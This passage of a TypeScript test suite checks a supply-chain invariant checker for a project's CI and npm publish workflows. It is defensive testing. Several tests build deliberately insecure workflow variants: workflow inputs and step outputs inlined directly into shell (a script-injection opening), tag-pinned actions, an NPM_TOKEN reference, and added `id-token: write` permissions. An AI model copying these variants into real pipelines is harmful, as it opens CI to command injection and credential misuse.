      join(dir, "SECURITY.md"),
      overrides.securityContent ?? "No local build references.",
    );
    await writeFile(
      join(dir, "package.json"),
      overrides.packageContent ?? wellFormedPackage,
    );
    await writeFile(
      join(dir, "pnpm-workspace.yaml"),
      overrides.workspaceContent ?? wellFormedWorkspace,
    );
    await writeFile(
      join(dir, "pnpm-lock.yaml"),
      overrides.lockContent ?? wellFormedLock,
    );
    await writeFile(
      join(dir, "tests", "integration", "verify-timeout-abort.test.ts"),
      overrides.verifyTimeoutAbortContent ?? wellFormedVerifyTimeoutAbort,
    );
    return dir;
  }

  async function cleanup() {
    if (root) {
      await rm(root, { recursive: true, force: true });
      root = undefined;
    }
  }

  function packageWithScript(name: string, value: string): string {
    const pkg = JSON.parse(wellFormedPackage) as {
      scripts: Record<string, string>;
    };
    pkg.scripts[name] = value;
    return JSON.stringify(pkg, null, 2);
  }

  function packageWithScripts(scripts: Record<string, string>): string {
    const pkg = JSON.parse(wellFormedPackage) as {
      scripts: Record<string, string>;
    };
    Object.assign(pkg.scripts, scripts);
    return JSON.stringify(pkg, null, 2);
  }

  it("passes on a well-formed tree", async () => {
    root = await buildTree();
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBe(0);
    await cleanup();
  });

  it("fails when the standard job omits the filesystem containment gate", async () => {
    root = await buildTree({
      ciContent: wellFormedCi.replace(
        "      - run: pnpm check:fs-containment\n",
        "",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the standard job omits the security hardening gate", async () => {
    root = await buildTree({
      ciContent: wellFormedCi.replace(
        "      - run: pnpm check:security-hardening\n",
        "",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the standard job repeats a filesystem security gate", async () => {
    root = await buildTree({
      ciContent: wellFormedCi.replace(
        "      - run: pnpm check:security-hardening",
        [
          "      - run: pnpm check:security-hardening",
          "      - run: pnpm check:security-hardening",
        ].join("\n"),
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the standard job adds a standalone fs-authority scan", async () => {
    // check:security-hardening already runs that gate internally.
    root = await buildTree({
      ciContent: wellFormedCi.replace(
        "      - run: pnpm check:fs-containment",
        [
          "      - run: pnpm check:fs-containment",
          "      - run: pnpm check:fs-authority",
        ].join("\n"),
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when classify runs the checked-out verification-scope script directly", async () => {
    root = await buildTree({
      ciContent: wellFormedCi.replace(
        [
          '          trusted_classifier="$RUNNER_TEMP/verification-scope.mjs"',
          '          if git cat-file -e "$BASE_REF:scripts/verification-scope.mjs" 2>/dev/null; then',
          '            git show "$BASE_REF:scripts/verification-scope.mjs" > "$trusted_classifier"',
          '            node "$trusted_classifier" --base "$BASE_REF" --format github',
          "          else",
          '            echo "docs=true" >> "$GITHUB_OUTPUT"',
          '            echo "standard=true" >> "$GITHUB_OUTPUT"',
          "          fi",
        ].join("\n"),
        "          node scripts/verification-scope.mjs --base HEAD --format github",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when classify omits the no-base-classifier fail-safe outputs", async () => {
    root = await buildTree({
      ciContent: wellFormedCi.replace(
        [
          "          else",
          '            echo "docs=true" >> "$GITHUB_OUTPUT"',
          '            echo "standard=true" >> "$GITHUB_OUTPUT"',
          "          fi",
        ].join("\n"),
        ["          else", "            exit 1", "          fi"].join("\n"),
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when classify inlines the base ref expression into shell", async () => {
    root = await buildTree({
      ciContent: wellFormedCi
        .replace(
          "        env:\n          BASE_REF: ${{ steps.base.outputs.ref }}\n",
          "",
        )
        .replace(
          '            node "$trusted_classifier" --base "$BASE_REF" --format github',
          '            node "$trusted_classifier" --base ${{ steps.base.outputs.ref }} --format github',
        ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when ci-status inlines classifier outputs into shell", async () => {
    root = await buildTree({
      ciContent: wellFormedCi.replace(
        '          if [ "$DOCS_OUTPUT" != "true" ] && [ "$DOCS_OUTPUT" != "false" ]; then',
        '          docs_output="${{ needs.classify.outputs.docs }}"\n          if [ "$docs_output" != "true" ] && [ "$docs_output" != "false" ]; then',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when Windows process-control coverage uses a name filter", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        "      - run: pnpm exec vitest run --config vitest.integration.config.ts tests/integration/verify-timeout-abort.test.ts",
        '      - run: pnpm exec vitest run --config vitest.integration.config.ts -t "timeout"',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when deep CI status inlines workflow inputs into shell", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        '          case "$SCOPE" in',
        '          scope="${{ github.event.inputs.scope }}"\n          case "$scope" in',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when deep CI status does not reject unknown scopes", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        [
          '          case "$SCOPE" in',
          "            all|linux-deep|node24|windows) ;;",
          "            *)",
          '              echo "invalid deep CI scope: $SCOPE"',
          "              exit 1",
          "              ;;",
          "          esac",
        ].join("\n"),
        '          echo "checking deep CI scope: $SCOPE"',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when required PR CI includes a Windows job", async () => {
    root = await buildTree({
      ciContent:
        wellFormedCi +
        "\n\n  windows-process-control:\n    runs-on: windows-latest\n    steps:\n      - run: pnpm build\n",
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when required PR CI runs full integration directly", async () => {
    root = await buildTree({
      ciContent: wellFormedCi.replace(
        "      - run: pnpm test:ci",
        "      - run: pnpm exec vitest run --config vitest.integration.config.ts",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when Windows process-control coverage is missing from all workflows", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        "windows-latest",
        "ubuntu-latest",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test:ci accidentally includes full integration", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:ci",
        "pnpm check:supply-chain && pnpm typecheck && pnpm test:unit && pnpm build && vitest run --config vitest.integration.config.ts && pnpm test:integration:smoke && node dist/cli.js --version && node dist/cli.js --json --version",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test:ci accidentally includes docs checks", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:ci",
        "pnpm check:supply-chain && pnpm check:docs && pnpm typecheck && pnpm test:unit && pnpm build && pnpm test:integration:smoke && node dist/cli.js --version && node dist/cli.js --json --version",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test:ci omits smoke integration", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:ci",
        "pnpm check:supply-chain && pnpm typecheck && pnpm test:unit && pnpm build && node dist/cli.js --version && node dist/cli.js --json --version",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test:ci:deep omits full integration", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:ci:deep",
        "pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm typecheck && pnpm test:unit && pnpm build && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json && pnpm test:cli:init-smoke",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when test omits integration", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript("test", "pnpm test:unit"),
    );
    expect(violations).toContain(
      "package.json: scripts.test must invoke pnpm test:integration",
    );
  });

  it("fails when test conditionally invokes integration", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript("test", "pnpm test:unit || pnpm test:integration"),
    );
    expect(violations).toContain(
      "package.json: scripts.test must use a fail-fast && chain",
    );
  });

  it("fails when test ignores unit failures before integration", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript("test", "pnpm test:unit ; pnpm test:integration"),
    );
    expect(violations).toContain(
      "package.json: scripts.test must use a fail-fast && chain",
    );
  });

  it("allows pnpm run script invocations in fail-fast chains", async () => {
    const violations = checkCiPackageScripts(
      packageWithScripts({
        test: "pnpm run test:unit && pnpm run test:integration",
        "test:integration": "pnpm run test:integration:full",
        "test:integration:full":
          "pnpm run build && vitest run --config vitest.integration.config.ts",
        "release:check":
          "pnpm typecheck && pnpm run test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      }),
    );
    expect(violations).toEqual([]);
  });

  it("fails when full integration only echoes the build command", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "test:integration:full",
        "echo pnpm build && vitest run --config vitest.integration.config.ts",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.test:integration:full must invoke pnpm build",
    );
  });

  it("fails when full integration only echoes the vitest command", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "test:integration:full",
        "pnpm build && echo vitest run --config vitest.integration.config.ts",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.test:integration:full must run full integration",
    );
  });

  it("fails when test:integration omits full integration", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "test:integration",
        "vitest run --config vitest.integration.smoke.config.ts",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.test:integration must invoke pnpm test:integration:full",
    );
  });

  it("does not treat pnpm test:unit as pnpm test in release:check", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck && pnpm test:unit && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must invoke pnpm test",
    );
  });

  it("fails when release:check conditionally invokes test", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck || pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must use a fail-fast && chain",
    );
  });

  it("fails when release:check only echoes dist commands", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck && pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && echo node dist/cli.js validate --json && echo node dist/cli.js plan lint --include-quality --strict --json && echo node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must execute node dist/cli.js validate --json",
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must execute node dist/cli.js plan lint --include-quality --strict --json",
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must execute node dist/cli.js plan analyze --strict --json",
    );
  });

  it("fails when release:check adds arguments to a dist command", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck && pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json --unexpected && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must execute node dist/cli.js validate --json",
    );
  });

  it("fails when release:check validates dist before test builds it", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck && node dist/cli.js validate --json && pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must invoke pnpm test before node dist/cli.js validate --json",
    );
  });

  it("fails when release:check reintroduces a duplicate build", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "release:check",
        "pnpm typecheck && pnpm test && pnpm build && pnpm check:docs && pnpm check:supply-chain && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when release:check reintroduces a duplicate build via pnpm run", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck && pnpm test && pnpm run build && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must not run a duplicate pnpm build",
    );
  });

  it("fails when full integration stops building dist first", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:integration:full",
        "vitest run --config vitest.integration.config.ts",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when ci-deep.yml omits Node 24 smoke", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        "  node-24-smoke:",
        "  node-24-smoke-removed:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when ci-deep.yml is not workflow_dispatch-only", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        "on:\n  workflow_dispatch:",
        "on:\n  pull_request:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when POSIX signal cancellation coverage is missing", async () => {
    const brokenCoverage = wellFormedVerifyTimeoutAbort
      .replace('if (process.platform !== "win32") {', "")
      .replace('it.each(["SIGINT", "SIGTERM"] as const)', "it(");

    const violations = checkCancellationCoverage(brokenCoverage);
    expect(violations).toContain(
      "verify-timeout-abort.test.ts: POSIX CLI signal cancellation must be explicitly POSIX-gated",
    );
    expect(violations).toContain(
      "verify-timeout-abort.test.ts: POSIX SIGINT/SIGTERM cancellation cases are missing",
    );

    root = await buildTree({ verifyTimeoutAbortContent: brokenCoverage });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when Windows bounded-command cancellation coverage is missing", async () => {
    const brokenCoverage = wellFormedVerifyTimeoutAbort
      .replace(
        'describe.runIf(process.platform === "win32")("Windows bounded-command cancellation contract"',
        'describe.skip("Windows bounded-command cancellation contract"',
      )
      .replaceAll(
        'termination: { strategy: "taskkill" },',
        "termination: undefined,",
      );

    const violations = checkCancellationCoverage(brokenCoverage);
    expect(violations).toContain(
      "verify-timeout-abort.test.ts: Windows bounded-command cancellation coverage is missing",
    );
    expect(violations).toContain(
      "verify-timeout-abort.test.ts: Windows coverage must assert taskkill cleanup",
    );

    root = await buildTree({ verifyTimeoutAbortContent: brokenCoverage });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when pnpm is below the reviewed security release", async () => {
    root = await buildTree({
      packageContent: wellFormedPackage.replace("pnpm@10.34.2", "pnpm@10.33.2"),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when Vite is below the reviewed version", async () => {
    root = await buildTree({
      packageContent: wellFormedPackage.replace("^8.1.4", "^8.1.3"),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the lockfile Vite specifier differs from the reviewed range", async () => {
    root = await buildTree({
      lockContent: wellFormedLock.replace(
        "        specifier: ^8.1.4",
        "        specifier: ^8.1.3",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the lockfile Vite resolution differs from the reviewed version", async () => {
    root = await buildTree({
      lockContent: wellFormedLock.replace(
        "        version: 8.1.4",
        "        version: 8.1.3",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the lockfile contains multiple Vite package versions", async () => {
    root = await buildTree({
      lockContent: wellFormedLock.replace(
        "  vite@8.1.4: {}\nsnapshots:",
        "  vite@8.1.4: {}\n  vite@8.1.3: {}\nsnapshots:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when esbuild lifecycle scripts are not explicitly denied", async () => {
    root = await buildTree({
      workspaceContent: wellFormedWorkspace.replace(
        "  esbuild: false",
        "  esbuild: true",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish.yml has a tag-pinned action", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
        "actions/checkout@v6.0.2",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when NPM_TOKEN is in publish.yml", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish + "\n# NPM_TOKEN reference",
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // The publish job has no checkout, so a repository path in its shell names a
  // file that does not exist on that runner — and `node` on a missing module
  // exits 1, the same code the probe reads as "not published yet". The gate
  // used to carve out one such script by name, which is how it survived.
  it("fails when publish job calls any repository script", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        '          version="$(node -p \'require("./release-artifact/release-manifest.json").version\')"',
        '          node scripts/check-npm-version-availability.mjs\n          version="$(node -p \'require("./release-artifact/release-manifest.json").version\')"',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job drops its own npm version gate", async () => {
    // Both jobs carry the same message now, and `String.replace` takes the
    // first hit — which is prepare's. Mutate only the publish half, or this
    // asserts something other than what it says.
    const publishStart = wellFormedPublish.indexOf("  publish:");
    expect(publishStart).toBeGreaterThan(0);
    const withoutGate =
      wellFormedPublish.slice(0, publishStart) +
      wellFormedPublish
        .slice(publishStart)
        .replace(
          "This release workflow supports npm 11.5.1 through npm 12.x",
          "some other message",
        );
    expect(withoutGate).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: withoutGate });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the registry probe loses its timeout", async () => {
    const unbounded = wellFormedPublish.replace(
      "AbortSignal.timeout(10000)",
      "undefined",
    );
    expect(unbounded).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: unbounded });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the registry probe stops distinguishing an unprovable state", async () => {
    const twoState = wellFormedPublish.replace(
      "unexpected status",
      "ignored status",
    );
    expect(twoState).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: twoState });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the probe stops pinning the registry", async () => {
    const unpinned = wellFormedPublish.replace(
      'registry !== "https://registry.npmjs.org"',
      "!registry",
    );
    expect(unpinned).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: unpinned });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // The R4 contract: the probe's process result and the registry state are
  // separate authorities. Each mutation below collapses them again, and each
  // must be refused by name rather than only by the canonical run hash — a
  // hash failure says "this changed", not "this is unsafe".
  it("fails when absence is signalled by a probe exit code", async () => {
    const byExitCode = wellFormedPublish.replace(
      '              process.stdout.write("absent\\n");\n              return;',
      "              process.exit(1);",
    );
    expect(byExitCode).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: byExitCode });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when a failed probe process is not refused", async () => {
    const noProcessGuard = wellFormedPublish.replace(
      "Registry probe process failed with exit",
      "Registry probe note",
    );
    expect(noProcessGuard).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: noProcessGuard });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when an unrecognized probe state is not refused", async () => {
    const noUnknownGuard = wellFormedPublish.replace(
      "Registry probe returned an unrecognized state",
      "Registry probe note",
    );
    expect(noUnknownGuard).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: noUnknownGuard });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the probe stops reporting state on stdout", async () => {
    const noStateChannel = wellFormedPublish.replace(
      'case "$probe_state" in',
      'case "$unused" in',
    );
    expect(noStateChannel).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: noStateChannel });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // R5: the npm version command's process result and its printed value are
  // separate authorities. Each mutation below collapses them again.
  for (const [label, marker] of [
    ["prepare", "  prepare:"],
    ["publish", "  publish:"],
  ] as const) {
    it(`fails when the ${label} job discards the npm version exit status`, async () => {
      const start = wellFormedPublish.indexOf(marker);
      const end =
        label === "prepare"
          ? wellFormedPublish.indexOf("  publish:")
          : wellFormedPublish.length;
      expect(start).toBeGreaterThan(0);

      const section = wellFormedPublish.slice(start, end);
      expect(section).toContain('if npm_version="$(npm --version)"');

      const mutated =
        wellFormedPublish.slice(0, start) +
        section.replace(
          /if npm_version="\$\(npm --version\)"[\s\S]*?fi\n/,
          "",
        ).replace(
          'NPM_VERSION="$npm_version" node',
          'NPM_VERSION="$(npm --version)" node',
        ) +
        wellFormedPublish.slice(end);
      expect(mutated).not.toBe(wellFormedPublish);

      root = await buildTree({ publishContent: mutated });
      const { failures } = checkSupplyChainInvariants(root);
      expect(failures).toBeGreaterThan(0);
      await cleanup();
    });
  }

  it("fails when the prepare job asks npm for its version twice", async () => {
    const twice = wellFormedPublish.replace(
      '          if npm_version="$(npm --version)"',
      "          npm --version\n          if npm_version=\"$(npm --version)\"",
    );
    expect(twice).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: twice });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the publish job drops the version process refusal", async () => {
    const publishStart = wellFormedPublish.indexOf("  publish:");
    const noRefusal =
      wellFormedPublish.slice(0, publishStart) +
      wellFormedPublish
        .slice(publishStart)
        .replace("unverified npm toolchain", "unremarkable npm toolchain");
    expect(noRefusal).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: noRefusal });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // P92: the distribution must be a step of the prepare job, positioned before
  // both readers of it. These four mutations are the ways v2.9.0 actually broke
  // or could break again — the first is exactly the state that failed on the
  // tag push.
  it("fails when the prepare job has no build step", async () => {
    const noBuild = wellFormedPublish.replace(
      '      - name: Build the distribution\n        run: |\n          pnpm build\n',
      "",
    );
    expect(noBuild).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: noBuild });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the build is ordered after the metadata assertion", async () => {
    const buildStep =
      "      - name: Build the distribution\n        run: |\n          pnpm build\n";
    const assertStep = "      - run: node scripts/assert-package-metadata.mjs\n";
    expect(wellFormedPublish).toContain(buildStep);
    expect(wellFormedPublish).toContain(assertStep);
    const swapped = wellFormedPublish
      .replace(buildStep + assertStep, assertStep + buildStep);
    expect(swapped).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: swapped });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the build is ordered after npm pack", async () => {
    const buildStep =
      "      - name: Build the distribution\n        run: |\n          pnpm build\n";
    const start = wellFormedPublish.indexOf(buildStep);
    expect(start).toBeGreaterThan(0);
    const withoutBuild =
      wellFormedPublish.slice(0, start) +
      wellFormedPublish.slice(start + buildStep.length);
    const packAnchor = "      - name: Build and inspect exact package tarball\n";
    expect(withoutBuild).toContain(packAnchor);
    const moved = withoutBuild.replace(
      packAnchor,
      packAnchor +
        "        # build moved after pack\n",
    );
    const packEnd =
      moved.indexOf("--pack-json pack.json") + "--pack-json pack.json".length + 1;
    const afterPack = moved.slice(0, packEnd) + buildStep + moved.slice(packEnd);
    expect(afterPack).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: afterPack });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the build is sourced from the release gate again", async () => {
    const viaGate = wellFormedPublish.replace(
      "          pnpm build\n",
      "          pnpm release:check\n",
    );
    expect(viaGate).not.toBe(wellFormedPublish);
    root = await buildTree({ publishContent: viaGate });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has checkout", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
        "      - name: Checkout\n        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          persist-credentials: false\n      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has pnpm install", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Install\n        run: pnpm install --frozen-lockfile\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has release:check", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Release check\n        run: pnpm release:check\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when prepare job has id-token: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      actions: read",
        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      actions: read\n      id-token: write",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when verify job has id-token: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  verify:\n    runs-on: ubuntu-latest\n    needs: [publish, prepare]\n    permissions:\n      contents: read",
        "  verify:\n    runs-on: ubuntu-latest\n    needs: [publish, prepare]\n    permissions:\n      contents: read\n      id-token: write",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has id-token: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  github-release:\n    name: Create verified GitHub Release\n    runs-on: ubuntu-latest\n    needs: [verify, provenance, prepare, publish]\n    permissions:\n      contents: write",
        "  github-release:\n    name: Create verified GitHub Release\n    runs-on: ubuntu-latest\n    needs: [verify, provenance, prepare, publish]\n    permissions:\n      contents: write\n      id-token: write",
      ),
    });
